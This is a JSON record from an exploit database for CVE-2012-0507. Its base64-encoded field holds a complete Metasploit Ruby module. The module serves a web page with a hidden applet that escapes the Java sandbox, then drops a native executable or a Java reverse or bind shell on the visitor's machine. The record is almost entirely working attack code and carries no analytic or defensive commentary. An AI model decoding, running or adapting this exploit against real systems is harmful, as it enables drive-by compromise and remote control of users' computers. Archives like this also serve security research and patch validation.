{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgRnJhbWV3b3JrIHdlYiBzaXRlIGZvciBtb3JlIGluZm9ybWF0aW9uIG9uIGxpY2Vuc2luZyBhbmQgdGVybXMgb2YgdXNlLg0KIyAgIGh0dHA6Ly9tZXRhc3Bsb2l0LmNvbS9mcmFtZXdvcmsvDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCnJlcXVpcmUgJ3JleCcNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KCVJhbmsgPSBFeGNlbGxlbnRSYW5raW5nDQoNCglpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIdHRwU2VydmVyOjpIVE1MDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkVYRQ0KDQoJZGVmIGluaXRpYWxpemUoIGluZm8gPSB7fSApDQoJCXN1cGVyKCB1cGRhdGVfaW5mbyggaW5mbywNCgkJCSdOYW1lJyAgICAgICAgICAgPT4gJ0phdmEgQXRvbWljUmVmZXJlbmNlQXJyYXkgVHlwZSBWaW9sYXRpb24gVnVsbmVyYWJpbGl0eScsDQoJCQknRGVzY3JpcHRpb24nICAgID0+ICVxew0KCQkJCQlUaGlzIG1vZHVsZSBleHBsb2l0cyBhIHZ1bG5lcmFiaWxpdHkgZHVlIHRvIHRoZSBmYWN0IHRoYXQNCgkJCQlBdG9taWNSZWZlcmVuY2VBcnJheSB1c2VzIHRoZSBVbnNhZmUgY2xhc3MgdG8gc3RvcmUgYSByZWZlcmVuY2UgaW4gYW4NCgkJCQlhcnJheSBkaXJlY3RseSwgd2hpY2ggbWF5IHZpb2xhdGUgdHlwZSBzYWZldHkgaWYgbm90IHVzZWQgcHJvcGVybHkuDQoJCQkJVGhpcyBhbGxvd3MgYSB3YXkgdG8gZXNjYXBlIHRoZSBKUkUgc2FuZGJveCwgYW5kIGxvYWQgYWRkaXRpb25hbCBjbGFzc2VzDQoJCQkJaW4gb3JkZXIgdG8gcGVyZm9ybSBtYWxpY2lvdXMgb3BlcmF0aW9ucy4NCgkJCX0sDQoJCQknTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KCQkJJ0F1dGhvcicgICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJJ3Npbm4zcicsICAgICAgICMgbWV0YXNwbG9pdCBtb2R1bGUNCgkJCQkJJ2p1YW4gdmF6cXVleicsICMgbWV0YXNwbG9pdCBtb2R1bGUNCgkJCQkJJ2VneXB0JyAgICAgICAgICMgc3BlY2lhbCBhc3Npc3RhbmNlDQoJCQkJXSwNCgkJCSdSZWZlcmVuY2VzJyAgICAgPT4NCgkJCQlbDQoJCQkJCVsnQ1ZFJywgJzIwMTItMDUwNyddLA0KCQkJCQlbJ0JJRCcsICc1MjE2MSddLA0KCQkJCQlbJ1VSTCcsICdodHRwOi8vd2VibG9nLmlrdm0ubmV0L1Blcm1hTGluay5hc3B4P2d1aWQ9Y2Q0ODE2OWEtOTQwNS00ZjYzLTkwODctNzk4YzRhMTg2NmQzJ10sDQoJCQkJCVsnVVJMJywgJ2h0dHA6Ly9ibG9ncy50ZWNobmV0LmNvbS9iL21tcGMvYXJjaGl2ZS8yMDEyLzAzLzIwL2FuLWludGVyZXN0aW5nLWNhc2Utb2YtanJlLXNhbmRib3gtYnJlYWNoLWN2ZS0yMDEyLTA1MDcuYXNweCddLA0KCQkJCQlbJ1VSTCcsICdodHRwczovL2J1Z3ppbGxhLnJlZGhhdC5jb20vc2hvd19idWcuY2dpP2lkPUNWRS0yMDEyLTA1MDcnXQ0KCQkJCV0sDQoJCQknUGxhdGZvcm0nICAgICAgID0+IFsgJ2phdmEnLCAnd2luJywgJ29zeCcsICdsaW51eCcsICdzb2xhcmlzJyBdLA0KCQkJJ1BheWxvYWQnICAgICAgICA9PiB7ICdTcGFjZScgPT4gMjA0ODAsICdCYWRDaGFycycgPT4gJycsICdEaXNhYmxlTm9wcycgPT4gdHJ1ZSB9LA0KCQkJJ1RhcmdldHMnICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnR2VuZXJpYyAoSmF2YSBQYXlsb2FkKScsDQoJCQkJCQl7DQoJCQkJCQkJJ1BsYXRmb3JtJyA9PiBbJ2phdmEnXSwNCgkJCQkJCQknQXJjaCcgPT4gQVJDSF9KQVZBLA0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCQlbICdXaW5kb3dzIHg4NiAoTmF0aXZlIFBheWxvYWQpJywNCgkJCQkJCXsNCgkJCQkJCQknUGxhdGZvcm0nID0+ICd3aW4nLA0KCQkJCQkJCSdBcmNoJyA9PiBBUkNIX1g4NiwNCgkJCQkJCX0NCgkJCQkJXSwNCgkJCQkJWyAnTWFjIE9TIFggUFBDIChOYXRpdmUgUGF5bG9hZCknLA0KCQkJCQkJew0KCQkJCQkJCSdQbGF0Zm9ybScgPT4gJ29zeCcsDQoJCQkJCQkJJ0FyY2gnID0+IEFSQ0hfUFBDLA0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCQlbICdNYWMgT1MgWCB4ODYgKE5hdGl2ZSBQYXlsb2FkKScsDQoJCQkJCQl7DQoJCQkJCQkJJ1BsYXRmb3JtJyA9PiAnb3N4JywNCgkJCQkJCQknQXJjaCcgPT4gQVJDSF9YODYsDQoJCQkJCQl9DQoJCQkJCV0sDQoJCQkJCVsgJ0xpbnV4IHg4NiAoTmF0aXZlIFBheWxvYWQpJywNCgkJCQkJCXsNCgkJCQkJCQknUGxhdGZvcm0nID0+ICdsaW51eCcsDQoJCQkJCQkJJ0FyY2gnID0+IEFSQ0hfWDg2LA0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCV0sDQoJCQknRGVmYXVsdFRhcmdldCcgID0+IDAsDQoJCQknRGlzY2xvc3VyZURhdGUnID0+ICdGZWIgMTQgMjAxMicNCgkJCSkpDQoJZW5kDQoNCg0KCWRlZiBleHBsb2l0DQoJCSMgbG9hZCB0aGUgc3RhdGljIGphciBmaWxlDQoJCXBhdGggPSBGaWxlLmpvaW4oIE1zZjo6Q29uZmlnLmluc3RhbGxfcm9vdCwgImRhdGEiLCAiZXhwbG9pdHMiLCAiQ1ZFLTIwMTItMDUwNy5qYXIiICkNCgkJZmQgPSBGaWxlLm9wZW4oIHBhdGgsICJyYiIgKQ0KCQlAamFyX2RhdGEgPSBmZC5yZWFkKGZkLnN0YXQuc2l6ZSkNCgkJZmQuY2xvc2UNCg0KCQlzdXBlcg0KCWVuZA0KDQoNCglkZWYgb25fcmVxdWVzdF91cmkoIGNsaSwgcmVxdWVzdCApDQoJCWRhdGEgPSAiIg0KCQlob3N0ID0gIiINCgkJcG9ydCA9ICIiDQoJCXBlZXIgPSAiI3tjbGkucGVlcmhvc3R9OiN7Y2xpLnBlZXJwb3J0fSINCg0KCQlpZiBub3QgcmVxdWVzdC51cmkubWF0Y2goL1wuamFyJC9pKQ0KCQkJaWYgbm90IHJlcXVlc3QudXJpLm1hdGNoKC9cLyQvKQ0KCQkJCXNlbmRfcmVkaXJlY3QoIGNsaSwgZ2V0X3Jlc291cmNlKCkgKyAnLycsICcnKQ0KCQkJCXJldHVybg0KCQkJZW5kDQoNCgkJCXByaW50X3N0YXR1cygiI3twZWVyfSAtIFNlbmRpbmcgI3tzZWxmLm5hbWV9IikNCg0KCQkJcGF5bG9hZCA9IHJlZ2VuZXJhdGVfcGF5bG9hZCggY2xpICkNCgkJCWlmIG5vdCBwYXlsb2FkDQoJCQkJcHJpbnRfZXJyb3IoIiN7cGVlcn0gLSBGYWlsZWQgdG8gZ2VuZXJhdGUgdGhlIHBheWxvYWQuIiApDQoJCQkJcmV0dXJuDQoJCQllbmQNCg0KCQkJaWYgdGFyZ2V0Lm5hbWUgPT0gJ0dlbmVyaWMgKEphdmEgUGF5bG9hZCknDQoJCQkJaWYgZGF0YXN0b3JlWydMSE9TVCddDQoJCQkJCWphciAgPSBwYXlsb2FkLmVuY29kZWQNCgkJCQkJaG9zdCA9IGRhdGFzdG9yZVsnTEhPU1QnXQ0KCQkJCQlwb3J0ID0gZGF0YXN0b3JlWydMUE9SVCddDQoJCQkJCXZwcmludF9zdGF0dXMoIkphdmEgcmV2ZXJzZSBzaGVsbCB0byAje2hvc3R9OiN7cG9ydH0gZnJvbSAje3BlZXJ9IiApDQoJCQkJZWxzZQ0KCQkJCQlwb3J0ID0gZGF0YXN0b3JlWydMUE9SVCddDQoJCQkJCWRhdGFzdG9yZVsnUkhPU1QnXSA9IGNsaS5wZWVyaG9zdA0KCQkJCQl2cHJpbnRfc3RhdHVzKCAiSmF2YSBiaW5kIHNoZWxsIG9uICN7Y2xpLnBlZXJob3N0fToje3BvcnR9Li4uIiApDQoJCQkJZW5kDQoJCQkJaWYgamFyDQoJCQkJCXByaW50X3N0YXR1cyggIkdlbmVyYXRlZCBqYXIgdG8gZHJvcCAoI3tqYXIubGVuZ3RofSBieXRlcykuIiApDQoJCQkJCWphciA9IFJleDo6VGV4dC50b19oZXgoIGphciwgcHJlZml4PSIiICkNCgkJCQllbHNlDQoJCQkJCXByaW50X2Vycm9yKCIje3BlZXJ9IC0gRmFpbGVkIHRvIGdlbmVyYXRlIHRoZSBleGVjdXRhYmxlLiIgKQ0KCQkJCQlyZXR1cm4NCgkJCQllbmQNCgkJCWVsc2UNCg0KCQkJCSMgTk9URTogVGhlIEVYRSBtaXhpbiBhdXRvbWFnaWNhbGx5IGhhbmRsZXMgZGV0ZWN0aW9uIG9mIGFyY2gvcGxhdGZvcm0NCgkJCQlkYXRhID0gZ2VuZXJhdGVfcGF5bG9hZF9leGUNCg0KCQkJCWlmIGRhdGENCgkJCQkJcHJpbnRfc3RhdHVzKCIje3BlZXJ9IC0gR2VuZXJhdGVkIGV4ZWN1dGFibGUgdG8gZHJvcCAoI3tkYXRhLmxlbmd0aH0gYnl0ZXMpLiIgKQ0KCQkJCQlkYXRhID0gUmV4OjpUZXh0LnRvX2hleCggZGF0YSwgcHJlZml4PSIiICkNCgkJCQllbHNlDQoJCQkJCXByaW50X2Vycm9yKCIje3BlZXJ9IC0gRmFpbGVkIHRvIGdlbmVyYXRlIHRoZSBleGVjdXRhYmxlLiIgKQ0KCQkJCQlyZXR1cm4NCgkJCQllbmQNCg0KCQkJZW5kDQoNCgkJCXNlbmRfcmVzcG9uc2VfaHRtbCggY2xpLCBnZW5lcmF0ZV9odG1sKCBkYXRhLCBqYXIsIGhvc3QsIHBvcnQgKSwgeyAnQ29udGVudC1UeXBlJyA9PiAndGV4dC9odG1sJyB9ICkNCgkJCXJldHVybg0KCQllbmQNCg0KCQlwcmludF9zdGF0dXMoICIje3BlZXJ9IC0gc2VuZGluZyBqYXIuLi4iICkNCgkJc2VuZF9yZXNwb25zZSggY2xpLCBnZW5lcmF0ZV9qYXIoKSwgeyAnQ29udGVudC1UeXBlJyA9PiAiYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIiB9ICkNCg0KCQloYW5kbGVyKCBjbGkgKQ0KCWVuZA0KDQoJZGVmIGdlbmVyYXRlX2h0bWwoIGRhdGEsIGphciwgaG9zdCwgcG9ydCApDQoJCWphcl9uYW1lID0gcmFuZF90ZXh0X2FscGhhKHJhbmQoNikrMykgKyAiLmphciINCg0KCQlodG1sICA9ICI8aHRtbD48aGVhZD48L2hlYWQ+Ig0KCQlodG1sICs9ICI8Ym9keT4iDQoJCWh0bWwgKz0gIjxhcHBsZXQgYXJjaGl2ZT1cIiN7amFyX25hbWV9XCIgY29kZT1cIm1zZi54LkV4cGxvaXQuY2xhc3NcIiB3aWR0aD1cIjFcIiBoZWlnaHQ9XCIxXCI+Ig0KCQlodG1sICs9ICI8cGFyYW0gbmFtZT1cImRhdGFcIiB2YWx1ZT1cIiN7ZGF0YX1cIi8+IiBpZiBkYXRhDQoJCWh0bWwgKz0gIjxwYXJhbSBuYW1lPVwiamFyXCIgdmFsdWU9XCIje2phcn1cIi8+IiBpZiBqYXINCgkJaHRtbCArPSAiPHBhcmFtIG5hbWU9XCJsaG9zdFwiIHZhbHVlPVwiI3tob3N0fVwiLz4iIGlmIGhvc3QNCgkJaHRtbCArPSAiPHBhcmFtIG5hbWU9XCJscG9ydFwiIHZhbHVlPVwiI3twb3J0fVwiLz4iIGlmIHBvcnQNCgkJaHRtbCArPSAiPC9hcHBsZXQ+PC9ib2R5PjwvaHRtbD4iDQoJCXJldHVybiBodG1sDQoJZW5kDQoNCglkZWYgZ2VuZXJhdGVfamFyKCkNCgkJcmV0dXJuIEBqYXJfZGF0YQ0KCWVuZA0KDQplbmQ=", 
    "filename": "platforms/multiple/remote/18679.rb", 
    "id": "18679", 
    "cves": [
        "CVE-2012-0507"
    ]
}